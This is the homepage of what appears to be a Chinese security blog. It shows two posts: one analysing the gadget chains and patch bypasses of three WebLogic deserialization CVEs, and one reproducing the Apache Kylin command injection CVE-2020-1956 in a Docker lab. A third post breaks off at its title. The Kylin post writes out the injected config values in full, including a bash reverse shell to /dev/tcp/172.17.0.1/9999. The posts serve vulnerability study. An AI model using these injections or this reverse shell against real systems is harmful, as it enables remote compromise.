<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-64x64-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="香依香偎, 闻道解惑" />





  <link rel="alternate" href="/atom.xml" title="闻道解惑" type="application/atom+xml" />






<meta name="description" content="闻道解惑, 香依香偎">
<meta name="keywords" content="闻道解惑, 香依香偎">
<meta property="og:type" content="website">
<meta property="og:title" content="闻道解惑">
<meta property="og:url" content="http://www.yaowendao.com/index.html">
<meta property="og:site_name" content="闻道解惑">
<meta property="og:description" content="闻道解惑, 香依香偎">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="闻道解惑">
<meta name="twitter:description" content="闻道解惑, 香依香偎">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://www.yaowendao.com/"/>





  <title>闻道解惑</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">闻道解惑</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2020/09/06/从WebLogic一脉相承的三个反序列化CVE说起/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/09/06/从WebLogic一脉相承的三个反序列化CVE说起/" itemprop="url">从 WebLogic 一脉相承的三个反序列化 CVE 说起</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-06T00:00:00+08:00">
                2020-09-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><code>Java</code> 反序列化漏洞的利用有两个条件。首先是漏洞点，也就是将攻击者可控的内容传递给 <code>ObjectInputStream.readObject()</code> 函数的调用链；另一个条件是<code>gadget</code>，也就是从某个类的反序列化入口函数 <code>readObject()</code> 开始，一步步执行到危险函数的调用链。 </p>
<p><code>WebLogic</code> 对于 <code>T3</code> 协议和 <code>IIOP</code> 协议的处理，天然就会进行反序列化的漏洞点。因此，对于 <code>WebLogic</code> 反序列化漏洞的挖掘，主要就是在 <code>gadget</code> 的寻找和补丁绕过上。</p>
<p>2020年的1月、4月和7月， <code>WebLogic</code> 先后爆出了三个一脉相承的反序列化 <code>CVE</code>，涉及了七个 <code>gadget</code>。下面简单分析一下这三个 <code>CVE</code> 以及相关的 <code>gadget</code>。</p>
<h2 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h2><p>2020年1月，<code>CVE-2020-2555</code> 被公开。这个反序列化 <code>gadget</code> 有三条利用链。</p>
<p>首先都是利用了 <code>JDK</code> 中的 <code>BadAttributeValueExpException</code>。这个类的特点是可以将对 <code>readObject()</code> 的调用，转换成对 <code>toString()</code> 函数的调用。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-01-badattributevalue.png" alt="01-badattributevalue"></p>
<p><code>BadAttributeValueExpException</code> 的这个特性，可以显著扩大反序列化 <code>gadget</code> 的范围，因此反序列化利用工具 <code>ysoserial</code> 中，有五条利用链都使用这个类作为入口。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-02-ysoserial-badattribute.png" alt="02-ysoserial-badattribute"></p>
<p>经过从 <code>readObject()</code> 到 <code>toString()</code> 的转换之后，找到真正的入口函数：<code>LimitFilter.toString()</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-03-limitfilter.png" alt="03-limitfilter"></p>
<p>函数中调用的两处 <code>extracotor.extract()</code> 函数来自接口 <code>ValueExtractor</code>.</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-04-valueextractor.png" alt="04-valueextractor"></p>
<p>搜索一下这个接口函数的实现，共29个。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-05-extract-implementations.png" alt="05-extract-implementation"></p>
<p><code>CVE-2020-2555</code> 的第一个调用链，利用了 <code>ChainedExtractor</code> 和 <code>ReflectionExtractor</code> 的两个 <code>extract()</code> 函数实现。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-06-chainedExtractor.png" alt="06-chainedExtractor"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-07-reflectionExtractor.png" alt="07-reflectionExtractor"></p>
<p>这两个实现可以完美的串起一条利用链，和 <code>ysoserial</code> 里 <code>CommonsCollections1</code> 利用链中所使用的 <code>ChainedTransformer.transform()</code> 和 <code>InvokerTransformer.transform()</code> 几乎一模一样。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-08-chainedTransformer.png" alt="08-chainedTransformer"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-09-invokerTransformer.png" alt="09-invokerTransformer"></p>
<p>因此我们可以构造出 <code>POC</code>，基本原则是：</p>
<ul>
<li><p>1、使用 <code>BadAttributeValueExpException</code> 作为反序列化的入口类，从而调用到 <code>toString()</code></p>
</li>
<li><p>2、使用 <code>LimitFilter</code> 对象作为前者的 <code>valObj</code>，从而调用到 <code>extract()</code></p>
</li>
<li><p>3、使用 <code>ChainedExtractor</code> 作为  <code>LimitFilter</code> 的 <code>m_comparator</code>，从而可以进行链式 <code>extract()</code>。</p>
</li>
<li><p>4、使用 <code>ReflectionExtract</code> 构建 <code>ChainedExtractor</code>，从而可以链式调用 <code>method.invoke()</code> 从而成功调用 <code>Runtime.getRuntime().exec()</code>。</p>
</li>
</ul>
<p>最终的调用栈如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-10-callstack.png" alt="10-callstack"></p>
<p><code>CVE-2020-2555</code> 的第二条利用链，同样来自上面 <code>29</code> 个 <code>ValueExtractor.extract()</code> 的实现类之一：<code>MvelExtractor</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-11-mvelExtract.png" alt="11-mvelExtractor"></p>
<p>熟悉 <code>MVEL</code> 的你应该一眼就看出了利用方法，只要使用 <code>MvelExtractor</code> 替换掉前一个利用链的 <code>3</code>、<code>4</code>两步就可以了。最终调用栈如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-12-callstack-mvelExtract.png" alt="12-callstack-mvelExtractor"></p>
<p>第三条利用链，同样来自上面 <code>29</code> 个实现类之一：<code>MultiExtractor</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-13-multiExtractor.png" alt="13-multiExtractor"></p>
<p>由于 <code>MultiExtractor.extract()</code> 函数中没有链式调用，因此我们可以将 <code>MultiExtractor</code> 作为连接第一条利用链中 <code>LimitFilter.toString()</code> 和 <code>ChainedExtractor.extract()</code> 的桥梁。<code>LimitFilter.toString()</code> 间接通过 <code>MultiExtractor.extract()</code> 调用到 <code>ChainedExtractor.extract()</code> 中。最终的调用栈如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-14-callstack-multiExtractor.png" alt="14-callstack-multiExtractor"></p>
<p>至于修复补丁，<code>Oracle</code> 打在了 <code>LimitFilter.toString()</code> 函数里。这个修复很神奇，仅仅封锁了三条调用链的入口，而从 <code>MultiExtractor.extract()</code> 经过 <code>ChainedExtractor.extract()</code> 调用到 <code>ReflectionExtractor.extract()</code> 的利用链、以及<code>MvelExtractor.extract()</code> 的利用链依然存在，只要再找一个入口就好了。</p>
<h2 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h2><p><code>2020</code> 年 <code>4</code> 月，<code>CVE-2020-2883</code> 被公开。同样的三条利用链，只是更换了入口函数。</p>
<p>前面说到，入口函数 <code>LimitFilter.toString()</code> 被修补，我们需要寻找一个新的入口。这个新入口同样可以在反序列化的时候，调用到 <code>ValueExtract.extract()</code> 中。</p>
<p>很快，大神们就找到了：<code>ExtractorCompartor.compare()</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-15-extractorComparator.png" alt="15-extractorComparator"></p>
<p><code>ExtractorComparator.compare()</code> 其实是对 <code>jdk</code> 中 <code>Comparator.compare()</code> 这个接口函数的实现。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-16-jdk-compartor.png" alt="16-jdk-comparator"></p>
<p>那么，怎么从 <code>readObject()</code> 调用到 <code>Comparator.compare()</code> 函数呢？ <code>ysoserial</code> 早就给出了答案：<code>PriorityQueue</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-17-ysoserial-PriorityQueue.png" alt="17-ysoserial-PriorityQueue"></p>
<p>调用链如下：</p>
<pre><code>PriorityQueue.readObject()

    -&gt; PriorityQueue.heapify()

        -&gt; PriorityQueue.siftDown()

            -&gt; PriorityQueue.siftDownUsingComparator()

                -&gt; Comparator.compare()
</code></pre><p>现在，我们将 <code>CVE-2020-2555</code> 的三条利用链稍加改造，就能实现 <code>CVE-2020-2883</code> 三条新的利用链：</p>
<ul>
<li><p>1、使用 <code>PriorityQueue</code> 代替 <code>BadAttributeValueExpException</code> 作为反序列化的入口类，从而通过 <code>readObject()</code> 调用到 <code>compare()</code></p>
</li>
<li><p>2、将 <code>ExtractorComparator</code> 对象设置为 <code>PriorityQueue</code> 的 <code>comparator</code> 属性值，从而通过 <code>compare()</code> 调用到 <code>extract()</code> </p>
</li>
<li><p>3、将 <code>ChaninedExtractor</code> 或 <code>MvelExtractor</code> 或 <code>MultiExtractor</code> 设置为 <code>PriorityQueue</code> 的队列元素，从而通过 <code>extract()</code> 调用到目标函数 <code>method.invoke()</code> 或 <code>MVEL.excuteExpression()</code></p>
</li>
</ul>
<p>这样就能顺利绕过 <code>CVE-2020-2555</code> 的补丁修复，构成了三条换汤不换药的新利用链。</p>
<p>以第一条利用链为例，最终的调用栈如下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-18-callstack-extractComparator.png" alt="18-callstack-extractComparator"></p>
<p>至于修复补丁，<code>Oracle</code> 并没有封禁利用链条上的 <code>PriorityQueue</code> 和 <code>ExtractComparator</code> ，只是将 <code>ReflectionExtractor</code> 和 <code>MvelExtractor</code> 放到了反序列化黑名单中。</p>
<p>仔细看下 <code>CVE-2020-2883</code> 的几个调用栈，从 <code>PriorityQueue.readObject()</code> 到 <code>ExtractorComparator.compare()</code> 再到 <code>ValueExtractor.extract()</code> 的利用链仍然存在，所以只需要在 29 个实现类中再找一个新的利用类就可以完成不定的绕过。</p>
<h2 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h2><p>腾讯蓝军很快就找到了新的可利用的实现类 <code>UniversalExtractor</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-19-universalExtractor.png" alt="19-UniversalExtractor"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-20-universalExtractor-extractComplex.png" alt="20-UniversalExtractor-extractCommplex"></p>
<p>只是这里在调用 <code>method.invoke()</code> 时存在限制条件，函数名称必须是 <code>get</code>或 <code>is</code> 起始。因此可以利用那些已知的 <code>Json</code> 反序列化 <code>gadget</code> 链进行攻击。最终的调用栈如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/weblogic-21-callstack-universalExtractor.png" alt="21-callstack-universalExtractor"></p>
<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>通常寻找反序列化 <code>gadget</code>，不论是用工具搜索还是手工进行，我们会将 <code>readObject()</code> 作为 <code>source</code>，将那些危险函数（如<code>method.invoke()</code>、<code>Runtime.exec()</code>、<code>FileOutputStream.write()</code>等）作为 <code>sink</code>进行查找。但其实，在 <code>Java</code> 纷繁复杂的各种依赖库中，已经存在了许许多多的代码链片段可以利用。例如 <code>BadAttributeValueExpException</code> 将 <code>toString()</code> 纳入了利用链，<code>PriorityQueue</code> 将 <code>compare()</code> 纳入了利用链，<code>ExtractorComparator</code> 将 <code>extract()</code> 纳入了利用链，等等等等。在搜索的时候，将这些扩展出的利用链作为 <code>source</code> 或 <code>sink</code>，会大大增加搜索的范围，也很可能会发现新的世界。</p>
<p>另一方面，对于漏洞的修复者而言，并不是堵住了入口就算修复了漏洞，而是要全方位封锁调用链上的方方面面，否则就会向 <code>Oracle</code> 一样留下永远补不完的 <code>CVE</code>。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2020/06/08/Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/08/Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析/" itemprop="url">Apache Kylin 命令注入漏洞 CVE-2020-1956 POC 分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-08T00:00:00+08:00">
                2020-06-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>来源：<a href="https://mp.weixin.qq.com/s/QzlHYST0kIqjNV-hnosyAw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-01-logo.png" alt="apache-kylin"></p>
<h2 id="零、CVE-2020-1956"><a href="#零、CVE-2020-1956" class="headerlink" title="零、CVE-2020-1956"></a>零、CVE-2020-1956</h2><p>2020年5月22日，<strong>CNVD</strong> 通报了 <strong>Apache Kylin</strong> 存在命令注入漏洞 <strong>CVE-2020-1956</strong>，地址在 <a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133</a> 。</p>
<blockquote>
<p><strong>Apache Kylin</strong> 是美国 <strong>Apache</strong> 软件基金会的一款开源的分布式分析型数据仓库。该产品主要提供 <strong>Hadoop/Spark</strong> 之上的 <strong>SQL</strong> 查询接口及多维分析（<strong>OLAP</strong>）等功能。</p>
<p><strong>Apache Kylin</strong> 中的静态 <strong>API</strong> 存在安全漏洞。攻击者可借助特制输入利用该漏洞在系统上执行任意OS命令。以下产品及版本受到影响：<strong>Apache Kylin</strong> 2.3.0版本至2.3.2版本，2.4.0版本至2.4.1版本，2.5.0版本至2.5.2版本，2.6.0版本至2.6.5版本，3.0.0-alpha版本，3.0.0-alpha2版本，3.0.0-beta版本，3.0.0版本，3.0.1版本。</p>
</blockquote>
<p>下面就来分析一下这个漏洞。</p>
<h2 id="一、搭建环境"><a href="#一、搭建环境" class="headerlink" title="一、搭建环境"></a>一、搭建环境</h2><p><strong>Kylin</strong> 的环境并不好搭建，包括 <strong>Hadoop、Hbase、Spark、Kafka</strong> 等等一系列的组件需要安装配置。幸好，<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html" target="_blank" rel="noopener">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a> 提供了 <strong>Docker</strong> 环境的启动指南，分别执行这两个命令即可一键启动。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull apachekylin/apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin/apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-02-start-page.png" alt="kylin-start-page"></p>
<p>使用默认密码 <strong>admin/KYLIN</strong> 登录，就能看到已经配置好的模型（<strong>models</strong>），环境搭建大功告成。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-03-models.png" alt="kylin-models"></p>
<h2 id="二、Migrate-Cube"><a href="#二、Migrate-Cube" class="headerlink" title="二、Migrate Cube"></a>二、Migrate Cube</h2><p>这个漏洞的补丁代码在 <strong>github</strong> 上，地址是 <a href="https://github.com/apache/kylin/commit/9cc3793ab2f2f0053c467a9b3f38cb7791cd436a#" target="_blank" rel="noopener">https://github.com/apache/kylin/commit/9cc3793ab2f2f0053c467a9b3f38cb7791cd436a#</a> 。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-04-patch-code.png" alt="patch-code"></p>
<p>从补丁代码里可以看出，漏洞点在 <strong>CubeService</strong> 中的 <strong>migrateCube()</strong> 函数，漏洞原因是使用 <strong>String.format()</strong> 格式化待执行的系统命令且未做过滤，导致命令内容可被注入，涉及的参数包括 <strong>srcCfgUri</strong>、<strong>dstCfgUri</strong>、<strong>projectName</strong>三个。</p>
<p><strong>Migrate Cube</strong> 是什么？在官网的文档的 Restful 章节 <a href="http://kylin.apache.org/cn/docs/howto/howto_use_restapi.html#migrate-cube" target="_blank" rel="noopener">http://kylin.apache.org/cn/docs/howto/howto_use_restapi.html#migrate-cube</a> 中，可以看到这个 Restful接口的描述：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-05-migrate-cube-doc.png" alt="migrate-cube-doc"></p>
<p>接口中显示需要两个路径入参，分别是 <strong>cube</strong> 和 <strong>project</strong>。回看 <strong>kylin</strong> 页面上的表格里，已经显示了 <strong>cube name</strong> 和对应的 <strong>Project</strong> 。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-03-models.png" alt="kylin-models"></p>
<p>我们选择第一行记录中的 <strong>cube</strong>：<strong>kylin_sales_cube</strong> 和对应的 <strong>Project</strong>：<strong>learn_kylin</strong> 作为路径参数，POST 这个报文看看。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-06-first-post.png" alt="kylin-first-post"></p>
<p>收到错误响应，提示 <strong>One click migration is disable</strong>。</p>
<p><a href="https://yaowendao.cn-bj.ufileos.com/kylin-07-first-post-response.png" target="_blank" rel="noopener">first-post-response</a></p>
<h2 id="二、Migrate-Cube-1"><a href="#二、Migrate-Cube-1" class="headerlink" title="二、Migrate Cube"></a>二、Migrate Cube</h2><p><strong>One click migration is disable</strong> 的提示，看起来有点眼熟。回看一眼<strong>patch code</strong>，嘿，原来这个错误提示就在 <strong>migrateCube()</strong> 函数的开头呀。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-08-code-for-response.png" alt="code-for-response"></p>
<p>对应的配置检查函数 <strong>isAllowAutoMigrateCube()</strong> 在 <strong>KylinConfigBase.java</strong> 中，从配置项中读取了 <strong>kylin.tool.auto-migrate-cube.enabled</strong>，默认值为 <strong>FALSE</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-09-enable-migrate.png" alt="migrate-"></p>
<p>如果要把配置修改为 <strong>true</strong>，有两个办法。</p>
<ul>
<li>方法一：使用 <strong>docker exec -it &lt;container_id&gt; bash</strong> 命令进入容器，修改其中 <strong>conf/kylin.properties</strong> 文件，增加 <strong>kylin.tool.auto-migrate-cube.enabled=true</strong> 的配置项，然后在容器中使用 <strong>bin/kylin stop</strong> 和 <strong>bin/kylin start</strong> 命令重启 <strong>kylin</strong>。</li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-10-enable-conffile.png" alt="enable-config"></p>
<ul>
<li>方法二：在 <strong>WEB</strong> 界面上点击 <strong>SYSTEM</strong> 和 <strong>SET Config</strong>，手动输入配置项名称 <strong>kylin.tool.auto-migrate-cube.enabled</strong> 和值 <strong>True</strong>。 </li>
</ul>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-11-setconfig.png" alt="set-config"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-12-setconfig.png" alt="set-config-2"></p>
<p>方法一是永久有效，只是需要重启 <strong>kylin</strong> 进程；方法二立即生效但进程重启或 <strong>Reload Config</strong> 之后就失效。我们选择相对简单一些的方法二来操作。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-13-server-config.png" alt="server-config"></p>
<p>修改完配置之后，再次发送 <strong>POST Migrate Cube</strong> 的报文，这次的报错提示为 <strong>Source configuration should not be empty.</strong></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-14-second-request.png" alt="second-request"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-15-second-response.png" alt="second-response"></p>
<p>对应代码中的 <strong>srcCfgUri</strong> 和 <strong>dstCfgUri</strong> 的非空检查。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-16-check-srcConfig.png" alt="check-srcConfig"></p>
<p>这两个值同样来自于配置项，分别是 <strong>kylin.tool.auto-migrate-cube.src-config</strong> 和 <strong>kylin.tool.auto-migrate-cube.dest-config</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-17-src-dst-cfguri.png" alt="src-dst-cfguri"></p>
<p>我们可以用前面配置 <strong>kylin.tool.auto-migrate-cube.enabled</strong> 同样的方法来配置这两个值。不过，在配置之前，你有没有注意到，这两个值，就是命令注入的关键参数呢？</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-18-cfgUri-injectable.png" alt="cfgUri"></p>
<h2 id="三、命令注入"><a href="#三、命令注入" class="headerlink" title="三、命令注入"></a>三、命令注入</h2><p>好，用 <strong>destCfgUri</strong> 来注入试试。在界面上 <strong>Set Config</strong>，把 <strong>srcCfgUri</strong> 配置为 <strong>/home/admin/apache-kylin-3.0.1-bin-hbase1x/conf/kylin.propertie</strong>，将 <strong>destCfgUri</strong> 配置为 <strong>/tmp/kylin.properties kylin_sales_cube learn_kylin true true true true; touch /tmp/xiang; echo</strong> 。注意其中注入了 <strong>touch /tmp/xiang</strong> 的系统命令。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-19-set-config-final.png" alt="set-config-final"></p>
<p>重新发起 <strong>Migrate Cube</strong> 的请求。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-20-new-request.png" alt="migrate-cube-request"></p>
<p>收到 <strong>200</strong> 成功响应。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-21-new-response.png" alt="migrate-cube-respnse"></p>
<p>查看 <strong>docker</strong> 容器，注入的命令 <strong>touch /tmp/xiang</strong> 已经成功执行。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-22-touch-file-success.png" alt="touch-file-success"></p>
<p>可以反弹 <strong>shell</strong> 么？当然可以。将 <strong>kylin.tool.auto-migrate-cube.dest-config</strong> 配置为 <strong>/tmp/kylin.properties kylin_sales_cube learn_kylin true true true true; bash -i &gt;&amp; /dev/tcp/172.17.0.1/9999 0&gt;&1; echo</strong> 。其中注入的命令从 <strong>touch /tmp/xiang</strong> 换成了反弹 <strong>shell</strong> 的命令 <strong>bash -i &gt;&amp; /dev/tcp/172.17.0.1/9999 0&gt;&amp;1</strong>，反弹到宿主机 <strong>172.17.0.1</strong> 上。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-23-reverse-shell-config.png" alt="reverse-shell-config"></p>
<p>在宿主机上启动监听。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-24-listen.png" alt="kylin-24-listen"></p>
<p>再发送一次 <strong>Migrate Cube</strong> 报文，等待几秒即可获取反弹 <strong>shell</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/kylin-25-reverse-shell-success.png" alt="reverse-shell-success"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2020/03/07/日志库logback的攻击路径/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/07/日志库logback的攻击路径/" itemprop="url">日志库logback的攻击路径</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-07T00:00:00+08:00">
                2020-03-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
